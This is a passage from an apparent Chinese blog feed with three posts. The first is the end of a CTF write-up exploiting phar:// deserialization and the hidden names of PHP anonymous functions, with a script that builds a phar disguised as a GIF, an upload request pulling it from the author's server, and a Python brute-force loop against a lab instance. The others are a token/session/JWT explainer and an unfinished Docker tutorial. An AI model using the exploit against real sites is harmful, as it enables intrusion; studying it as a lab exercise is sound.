class="hljs-string">&quot;/var/www/html&quot;</span>;<br>&#125;<br><br>header(<span class="hljs-string">&quot;Content-Type: image/gif&quot;</span>);<br><span class="hljs-keyword">die</span>(file_get_contents(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>));<br>&#125;<br><br><span class="hljs-variable">$mode</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;m&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> == <span class="hljs-string">&quot;upload&quot;</span>) &#123;<br>upload(check_session()); <span class="hljs-comment">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 请求url中的内容写到该路径下的avatar.gif文件中</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> == <span class="hljs-string">&quot;show&quot;</span>) &#123;<br>show(check_session()); <span class="hljs-comment">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 展示该目录下的avatar.gif</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>思路:</p><ul><li>首先分析代码, 首先分配了一个匿名函数给 flag 变量, 执行了这个函数就会出 flag, 所以整道题的核心就是执行这个匿名函数</li><li>题目主要有两个功能, 一个是在沙盒文件夹任意写入一个 gif, 一个是根据 cookie 中的路径查看这个 gif</li><li>一开始的想法是 —–&gt; admin 是关键类,需要通过反序列化之后的析构函数去触发其中的 eval —–&gt; 通过 lucky 参数去调用这个输出 flag 的函数. 而反序列化的 data 是从 cookie 中获得, 那先尝试一下伪造 cookie,但是其实 cookie 后半部分是用 hash_hmac 和一个未知的秘钥生成的一个签名, 基本上无法伪造…..所以放弃这个想法</li><li>咋一看好像代码里面并没有其他能够反序列化的地方了, 然后就来到了本题的第一个考点–php 中解析 Phar 归档中的 Metadata 的时候可能会有反序列化的操作, 文档中描述的 Phar::getMetadata 操作(<a href="http://php.net/manual/zh/phar.getmetadata.php">http://php.net/manual/zh/phar.getmetadata.php</a>)</li></ul><blockquote><ul><li>Phar?(方便开发者打包和发布 php 应用的类似于 Java 中的 Jar 的一种文件)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-a854e4d73e1be186.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="What is Phar?(官方文档)"></li><li>Phar 归档的结构<br><img src="http://upload-images.jianshu.io/upload_images/6949366-1a263bb5852f77a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Phar(官方文档)"></li><li>Metadata : Phar 归档中可用来描述此文档的一段序列化之后的字符串<img src="http://upload-images.jianshu.io/upload_images/6949366-f850f6f9d027f2df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="usage of Metadata(官方文档)"></li><li>phar_parse_metadata 的初始化调用, 具体 PHP 源码在 ext/phar/phar.c<br>执行流程大致为:<br>….–&gt; phar_open_from_filename(1512 行的 php_stream_open_wrapper 函数可以得知此函数处理 phar://打开本地 phar 文件 1531 行调用下一个函数)<img src="http://upload-images.jianshu.io/upload_images/6949366-a2c524ab1ddaff2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="phar_open_from_filename"><br>–&gt; phar_open_from_fp(1727 行调用下一个函数)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-f61c565686e8f90f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="phar_open_from_fp"><br>–&gt; phar_parse_pharfile(1038、1122 行调用下一个函数)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-4d37aa50d88c5bea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1038行"> &gt; <img src="http://upload-images.jianshu.io/upload_images/6949366-8c514575ce533262.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1122行"><br>–&gt; phar_parse_metadata(函数在 609 行)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-581792f19940680a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="phar_parse_metadata函数"></li></ul></blockquote><ul><li><p>而且题目内 upload 操作提供了<code>file_get_content()</code>函数 其中地址可控,可以利用<code>phar://</code>协议读取本地 phar 文件(phar 协议不支持远程文件[The <em>phar</em> stream wrapper does not operate on remote files, and cannot operate on remote files, and so is allowed even when the allow_url_fopen and allow_url_include INI options are disabled.</p><p>](<a href="http://php.net/manual/zh/phar.using.stream.php)),%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E5%8F%AA%E8%A6%81%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA">http://php.net/manual/zh/phar.using.stream.php)),也就是说只要构造一个</a> phar 利用 upload 写到服务器目录, 其中 metadata 设置为 Admin 对象,就可以进入 Admin 的析构函数了</p></li><li><p>接下来的问题就是如何猜出那个随机数?<br>答案是基本上猜不出来<a href="https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php">https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php</a> openssl_random_pseudo_bytes 是加密级别的伪随机数生成器<a href="https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator">https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator</a> 这是题目第二个死胡同</p></li><li><p>然后就到了题目的第二个考点, 匿名函数其实是有真正的名字 从注册匿名函数的源码(Zend/zend<em>builtin_functions.c 1854 行) 大佬还对这个逻辑戏谑了一番 <img src="http://upload-images.jianshu.io/upload_images/6949366-5c491572afb463d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="anonymous_functions_has_name"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-3f7ca4a955141198.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="name_of_anonymous_functions"><br>首先名字第一个字符被替换成了\0,也就是空字符 ,然后 do 操作将 lambda</em>%d 中的%d 格式化成匿名函数的个数+1(从 1 开始)<br>所以最后得出的匿名函数的真正名字为:\0lambda_%d(%d 格式化为当前进程的第 n 个匿名函数)</p></li><li><p>但是我们并不能知道当前的匿名函数到底有多少个, 因为每访问一次题目就会生成一个匿名函数; 最后就引出了最后一个考点, Apache-prefork 模型(默认模型)在接受请求后会如何处理,首先 Apache 会默认生成 5 个 child server 去等待用户连接, 默认最高可生成 256 个 child server, 这时候如果用户大量请求, Apache 就会在处理完 MaxRequestsPerChild 个 tcp 连接后 kill 掉这个进程,开启一个新进程处理请求(这里猜测 Orange 大大应该修改了默认的 0,因为 0 为永不 kill 掉子进程 这样就无法 fork 出新进程了) 在这个新进程里面匿名函数就会是从 1 开始的了</p></li></ul><p>最后步骤分别是:</p><ol><li>先生成符合要求的 phar 放入自己的 vps 中, 生成代码为</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span> = <span class="hljs-string">&#x27;xxx&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.phar&#x27;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;file.php&#x27;</span>] = <span class="hljs-string">&#x27;&lt;?php ?&gt;&#x27;</span>;<br><span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-keyword">new</span> Admin());<br><span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br>rename(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.phar&#x27;</span>,<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.gif&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>再请求<code>?m=upload&amp;url=http://vps</code></li><li>启动 Orange 大大写的 fork 脚本</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://0c166fcd-fdb3-4807-a385-a6cecf962fcd.node4.buuoj.cn/?m=upload&amp;url=phar:///var/www/data/aa8b91c60cf8b507932015218d2c847d&amp;lucky=%00lambda_1&#x27;</span><br><br>header = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;UM_distinctid=1780a89b22a7dd-03a5f4de894f678-4c3f227c-144000-1780a89b22b5be; session-data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A6%3A%22avatar%22%3Bs%3A46%3A%22%2Fvar%2Fwww%2Fdata%2Faa8b91c60cf8b507932015218d2c847d%22%3B%7D-----1415716c7f33898b0082543bd26f12ab93a24e31&#x27;</span><br>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r =requests.get(url,headers=header)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>认证及会话管理</title>
    <link href="/2021/05/29/Token%20Session%20Cookie%20JWT/"/>
    <url>/2021/05/29/Token%20Session%20Cookie%20JWT/</url>
    
    <content type="html"><![CDATA[<h1 id="Token-Session-Cookie-JWT"><a href="#Token-Session-Cookie-JWT" class="headerlink" title="Token Session Cookie JWT"></a>Token Session Cookie JWT</h1><h2 id="认证"><a href="#认证" class="headerlink" title="认证:"></a>认证:</h2><p>验证用户的身份 用户密码登录 短信验证码 邮箱验证码</p><h2 id="授权"><a href="#授权" class="headerlink" title="授权:"></a>授权:</h2><p>给以第三方应用访问改账户(个人)的某些信息资源 如：手机安装应用时 app 询问你 是否允许访问相册 使用你的麦克风、摄像头 访问联系人方式；微信小程序登录是否允许获取你的昵称、头像、地区、性别<br>实现授权的方式有：cookie、session、token、OAuth</p><h2 id="凭证"><a href="#凭证" class="headerlink" title="凭证:"></a>凭证:</h2><p>实现认证和授权的前提需要有证书 而这就是认证的凭证</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie:"></a>Cookie:</h2><p>用于记录用户的登录状态 <strong>在一级域名和二级域名之间可以共享使用 但不可跨域！</strong><br>| 参数 | 说明 |<br>| :——–: | :———————————————————-: |<br>| name=value | 键值对，设置 cookie 名和对应的值，要求为字符串类型 Unicode-字符编码 二进制-base64 |<br>| domain | cookie 所属域名 默认是当前域名 |<br>| path | 设置 cookie 在哪些目录生效 |<br>| maxAge | cookie 失效时间 整数 负数-1 则是临时 cookie 关闭浏览器就会失效 |<br>| expires | cookie 失效时间 |<br>| secure | 设置协议 https ssl 传输前就会加密数据 |<br>| httpOnly | 无法通过 js 读取到 cookie 但能在 Application 中修改 一定程度上防止了 xss 攻击 |</p><h2 id="Session"><a href="#Session" class="headerlink" title="Session:"></a>Session:</h2><p>基于 cookie 实现的记录服务器与客户端会话状态的机制 session 存于服务器端 sessionid 存储在客户端的 cookie 中<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1.png"></p><h2 id="Token"><a href="#Token" class="headerlink" title="Token:"></a>Token:</h2><ul><li><p>Access Token<br>|**uid(用户唯一标识)<br>|**time(当前时间的时间戳)<br>|__sign(token 前几位哈希压缩十六进制字符串)<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2.png"><br><strong>不受同源策略的限制！</strong></p></li><li><p>Refresh Token<br>刷新 Access Token 的 其实没有它也可以刷新 Token 但是每次刷新都会要用户输入登录的用户名和密码</p></li></ul><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/3.png"></p><h3 id="Token-和-Session-的区别"><a href="#Token-和-Session-的区别" class="headerlink" title="Token 和 Session 的区别"></a>Token 和 Session 的区别</h3><ul><li>Session 是一种<strong>记录服务器和客户端会话状态的机制，使服务端有状态化，可以记录会话信息</strong>。而 Token 是<strong>令牌</strong>，<strong>访问资源接口（API）时所需要的资源凭证</strong>。Token <strong>使服务端无状态化，不会存储会话信息。</strong></li><li>Session 和 Token 并不矛盾，作为身份认证 Token 安全性比 Session 好，因为每一个请求都有签名还能防止监听以及重放攻击，而 Session 就必须依赖链路层来保障通讯安全了。<strong>如果你需要实现有状态的会话，仍然可以增加 Session 来在服务器端保存一些状态。</strong></li><li>所谓 Session 认证只是简单的把 User 信息存储到 Session 里，因为 SessionID 的不可预测性，暂且认为是安全的。而 Token ，如果指的是 OAuth Token 或类似的机制的话，提供的是 认证 和 授权 ，认证是针对用户，授权是针对 App 。其目的是让某 App 有权利访问某用户的信息。这里的 Token 是唯一的。不可以转移到其它 App 上，也不可以转到其它用户上。Session 只提供一种简单的认证，即只要有此 SessionID ，即认为有此 User 的全部权利。是需要严格保密的，这个数据应该只保存在站方，不应该共享给其它网站或者第三方 App。所以简单来说：<strong>如果你的用户数据可能需要和第三方共享，或者允许第三方调用 API 接口，用 Token 。如果永远只是自己的网站，自己的 App，用什么就无所谓了。</strong></li></ul><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>利用 json 的一种认证授权机制，也是目前最流行的跨站认证的解决方案</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/4.png"></p><ul><li>跨域时 JWT 位于 POST 请求的数据体里</li><li>一般位于 http 的请求头 Authorization 里 用 Bearer 模式添加</li><li>URL 中包含</li></ul><h3 id="Token-和-JWT-的区别"><a href="#Token-和-JWT-的区别" class="headerlink" title="Token 和 JWT 的区别"></a>Token 和 JWT 的区别</h3><p><strong>相同：</strong></p><ul><li>都是访问资源的令牌</li><li>都可以记录用户的信息</li><li>都是使服务端无状态化</li><li>都是只有验证成功后，客户端才能访问服务端上受保护的资源</li></ul><p><strong>区别：</strong></p><ul><li>Token：服务端验证客户端发送过来的 Token 时，还需要查询数据库获取用户信息，然后验证 Token 是否有效。</li><li>JWT： 将 Token 和 Payload 加密后存储于客户端，服务端只需要使用密钥解密进行校验（校验也是 JWT 自己实现的）即可，不需要查询或者减少查询数据库，因为 JWT 自包含了用户信息和加密的数据。</li></ul><p><strong>使用 cookie 时需要考虑的问题</strong></p><ul><li>因为存储在客户端，容易被客户端篡改，使用前需要验证合法性</li><li>不要存储敏感数据，比如用户密码，账户余额</li><li>使用 httpOnly 在一定程度上提高安全性</li><li>尽量减少 cookie 的体积，能存储的数据量不能超过 4kb</li><li>设置正确的 domain 和 path，减少数据传输</li><li><strong>cookie 无法跨域</strong></li><li>一个浏览器针对一个网站最多存 20 个 Cookie，浏览器一般只允许存放 300 个 Cookie</li><li><strong>移动端对 cookie 的支持不是很好，而 session 需要基于 cookie 实现，所以移动端常用的是 token</strong></li></ul><p><strong>使用 session 时需要考虑的问题</strong></p><ul><li>将 session 存储在服务器里面，当用户同时在线量比较多时，这些 session 会占据较多的内存，需要在服务端定期的去清理过期的 session</li><li>当网站采用<strong>集群部署</strong>的时候，会遇到多台 web 服务器之间如何做 session 共享的问题。因为 session 是由单个服务器创建的，但是处理用户请求的服务器不一定是那个创建 session 的服务器，那么该服务器就无法拿到之前已经放入到 session 中的登录凭证之类的信息了。</li><li>当多个应用要共享 session 时，除了以上问题，还会遇到跨域问题，因为不同的应用可能部署的主机不一样，需要在各个应用做好 cookie 跨域的处理。</li><li><strong>sessionId 是存储在 cookie 中的，假如浏览器禁止 cookie 或不支持 cookie 怎么办？</strong> 一般会把 sessionId 跟在 url 参数后面即重写 url，所以 session 不一定非得需要靠 cookie 实现</li><li><strong>移动端对 cookie 的支持不是很好，而 session 需要基于 cookie 实现，所以移动端常用的是 token</strong></li></ul><p><strong>使用 token 时需要考虑的问题</strong></p><ul><li>如果你认为用数据库来存储 token 会导致查询时间太长，可以选择放在内存当中。比如 redis 很适合你对 token 查询的需求。</li><li><strong>token 完全由应用管理，所以它可以避开同源策略</strong></li><li><strong>token 可以避免 CSRF 攻击(因为不需要 cookie 了)</strong></li><li><strong>移动端对 cookie 的支持不是很好，而 session 需要基于 cookie 实现，所以移动端常用的是 token</strong></li></ul><p><strong>使用 JWT 时需要考虑的问题</strong></p><ul><li>因为 JWT 并不依赖 Cookie 的，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS）</li><li>JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。</li><li>JWT 不加密的情况下，不能将秘密数据写入 JWT。</li><li>JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</li><li>JWT 最大的优势是服务器不再需要存储 Session，使得服务器认证鉴权业务可以方便扩展。但这也是 JWT 最大的缺点：由于服务器不需要存储 Session 状态，因此使用过程中无法废弃某个 Token 或者更改 Token 的权限。也就是说一旦 JWT 签发了，到期之前就会始终有效，除非服务器部署额外的逻辑。</li><li>JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</li><li>JWT 适合一次性的命令认证，颁发一个有效期极短的 JWT，即使暴露了危险也很小，由于每次操作都会生成新的 JWT，因此也没必要保存 JWT，真正实现无状态。</li><li>为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</li></ul>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker</title>
    <link href="/2021/05/27/Docker/"/>
    <url>/2021/05/27/Docker/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker🐋"><a href="#Docker🐋" class="headerlink" title="Docker🐋"></a>Docker🐋</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>众所周知 开发一个项目时 有几个阶段： 开发、测试、生产 而开发时会遇到开发环境的差异 而造成开发的项目出现水土不服 此时为了避免出现这种情况 可以把软件以及环境打包 即解决了软件跨环境迁移的问题 Docker 就是装这个包的容器</p><ul><li><input checked="" disabled="" type="checkbox"> 开源</li><li><input checked="" disabled="" type="checkbox"> Go 语言</li><li><input checked="" disabled="" type="checkbox"> 打包后可以迁移到任何的 linux 的主机上</li><li><input checked="" disabled="" type="checkbox"> 沙箱机制 相互隔离 互不影响 <del>Docker 逃逸</del></li></ul><h2 id="二、架构"><a href="#二、架构" class="headerlink" title="二、架构"></a>二、架构</h2><p><strong>镜像：</strong>Docker 镜像可以类比为 类<br><strong>容器：</strong>可以看作是镜像的 对象 可：创建、启动、停止、删除、暂停<br><strong>仓库：</strong>用来保存镜像</p><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fhbimg.b0.upaiyun.com%2F3d7083fa7d291a90b05822583933224958a2af4d9067-6N1RKd_fw658&refer=http%3A%2F%2Fhbimg.b0.upaiyun.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113477&t=45b612ce6703b9aed09040223b8fee44"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fseo-1255598498.file.myqcloud.com%2Ffull%2F66ec0965a96e9a6d2d1c191ebcc8807ba71baa93.jpg&refer=http%3A%2F%2Fseo-1255598498.file.myqcloud.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113819&t=6abc442e6df87436f6b850b78b48ceda"></p><h2 id="三、命令"><a href="#三、命令" class="headerlink" title="三、命令"></a>三、命令</h2><p>阿里云弄一下镜像加速器</p><p>docker</p><ul><li>服务：</li></ul><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">启动<span class="hljs-keyword"> system</span>ctl start docaker<br>停止<span class="hljs-keyword"> system</span>ctl stop docker<br>重启<span class="hljs-keyword"> system</span>ctl restart docker<br>开机自启<span class="hljs-keyword"> system</span>ctl enable docker<br></code></pre></td></tr></table></figure><ul><li>镜像：</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">local</span>：<br>查看 <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">images</span><br>删除(注意不能删除正在运行的容器) <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">rmi</span> <span class="hljs-selector-tag">id</span>(image)/<span class="hljs-selector-tag">redis</span>:<span class="hljs-selector-tag">version</span><br><span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">rmi</span> `<span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">images</span> <span class="hljs-selector-tag">-q</span>`(全删 `为esc的键)<br><span class="hljs-selector-tag">remote</span>(加速器)：<br>搜索 <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">search</span> <span class="hljs-selector-tag">redis</span><br>拉取 <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">pull</span> <span class="hljs-selector-tag">redis</span> (:version)<br></code></pre></td></tr></table></figure><p>有时要到他的官方仓库找镜像 搜索命令不一定能看到你需要的版本</p><ul><li>⭐ 容器：</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">创建 docker run -i(保持运行) -t(分配终端接收命令) --name=first 镜像名(:version(有多个版本时)) <span class="hljs-regexp">/bin/</span>bash(进入容器 打开shell 可省略) <span class="hljs-keyword">exit</span>退出 容器关闭<br>     参数也能写作 -it(称作交互式容器) --name first<br>查看所有容器 docker ps -a (up正在运行 exited退出)<br>后台创建 docker run -id(守护式容器) --name=first 镜像名 <span class="hljs-regexp">/bin/</span>bash(不进入容器) 容器退出后不会关闭<br>进入 docker exec -it first <span class="hljs-regexp">/bin/</span>bash(不可省略)<br>启动(已经停止的容器) docker start 镜像id/镜像名<br>停止 docker stop 镜像名<br>查看 docker inspect 镜像名<br>删除 docker rm 容器id<br>docker rm `docker ps -a -q`(全删)<br></code></pre></td></tr></table></figure><h2 id="四、数据卷"><a href="#四、数据卷" class="headerlink" title="四、数据卷"></a>四、数据卷</h2><p>问题：<br>1、Docker 容器删除后 容器中产生的数据还有吗 没有</p><p>2、容器之间怎么数据交互</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155318730.png"></p><p><strong>物理机 windows 上 vm 搭建 linux linux 上使用 Docker</strong><br>3、Docker 容器与外部的物理机(注意物理机指 windows)能直接交互文件吗 不能<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155426461.png"></p><ul><li><p>数据卷是 linux 的一个目录或文件 把容器装载到数据卷上(对方的修改都会立即同步）<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155501288.png"></p></li><li><p>一个数据卷可以装载多个容器</p></li></ul><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155156627.png"></p><ul><li><p>一个容器可以挂载多个数据卷<br><code>docker -it --name=first \</code><br><code>-v ../../...</code><br><code>-v ../../xxx</code></p></li><li><p><input checked="" disabled="" type="checkbox">  数据卷可以和物理机交换文件</p></li><li><p><input checked="" disabled="" type="checkbox">  容器间通过数据卷完成数据交互</p></li></ul><p>配置数据卷在创建容器时使用<code>-v ../../../xxx(绝对路径)</code></p><p>路径在 linux 的路径下设置</p><p>问题 1：删除容器后 Docker 没有了产生的数据 但数据卷会保留容器产生的数据 扩展：恢复容器再次挂载数据卷 数据仍然可以使用</p><p>2：同一个数据卷的容器 在数据卷的内容相同 对数据卷的操作同时生效</p><h2 id="五、数据卷容器"><a href="#五、数据卷容器" class="headerlink" title="五、数据卷容器"></a>五、数据卷容器</h2><p>当多容器进行数据交换时 再使用同一个数据卷就不方便了 此时需要数据卷容器</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155917095.png"></p><p>此时相当于两个容器 c1c2 直接挂载到数据卷上 假如此时的 C3 坏了 c1c2 与数据卷的联系也没有断</p><p>挂载步骤</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">c3:<br>docker <span class="hljs-builtin-name">run</span> -it <span class="hljs-attribute">--name</span>=c3 -v **/volume(此目录不可改 由Docker分配)** 镜像名<br><br>c1c2:<br>docker <span class="hljs-builtin-name">run</span> -it <span class="hljs-attribute">--name</span>=c1 --volumns-from c3 镜像名<br><br>docker <span class="hljs-builtin-name">run</span> -it <span class="hljs-attribute">--name</span>=c2 --volumns-from c3 镜像名<br></code></pre></td></tr></table></figure><h2 id="六、应用部署"><a href="#六、应用部署" class="headerlink" title="六、应用部署"></a>六、应用部署</h2><h3 id="Ⅰ、部署-MySQL"><a href="#Ⅰ、部署-MySQL" class="headerlink" title="Ⅰ、部署 MySQL"></a>Ⅰ、部署 MySQL</h3><ol><li>搜索 mysql 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search mysql<br></code></pre></td></tr></table></figure><ol start="2"><li>拉取 mysql 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull mysql:5.6<br></code></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射、目录映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 在/root目录下创建mysql目录用于存储mysql数据信息</span><br>mkdir ~/mysql<br>cd ~/mysql<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id \<br>-p 3307:3306 \<br>--name=c_mysql \<br>-v $PWD/conf:/etc/mysql/conf.d \<br>-v $PWD/logs:/logs \<br>-v $PWD/data:/var/lib/mysql \<br>-e MYSQL_ROOT_PASSWORD=123456 \<br>mysql:5.6<br></code></pre></td></tr></table></figure><ul><li>参数说明：<ul><li><strong>-p 3307:3306</strong>：将容器的 3306 端口映射到宿主机的 3307 端口。</li><li><strong>-v $PWD/conf:/etc/mysql/conf.d</strong>：将主机当前目录下的 conf/my.cnf 挂载到容器的 /etc/mysql/my.cnf。配置目录</li><li><strong>-v $PWD/logs:/logs</strong>：将主机当前目录下的 logs 目录挂载到容器的 /logs。日志目录</li><li><strong>-v $PWD/data:/var/lib/mysql</strong> ：将主机当前目录下的 data 目录挂载到容器的 /var/lib/mysql 。数据目录</li><li><strong>-e MYSQL_ROOT_PASSWORD=123456：</strong>初始化 root 用户的密码。</li></ul></li></ul><ol start="4"><li>进入容器，操作 mysql</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec –it c_mysql /bin/bash<br></code></pre></td></tr></table></figure><ol start="5"><li>使用外部机器连接容器中的 mysql</li></ol><h3 id="Ⅱ、部署-Tomcat"><a href="#Ⅱ、部署-Tomcat" class="headerlink" title="Ⅱ、部署 Tomcat"></a>Ⅱ、部署 Tomcat</h3><ol><li>搜索 tomcat 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search tomcat<br></code></pre></td></tr></table></figure><ol start="2"><li>拉取 tomcat 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull tomcat<br></code></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射、目录映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 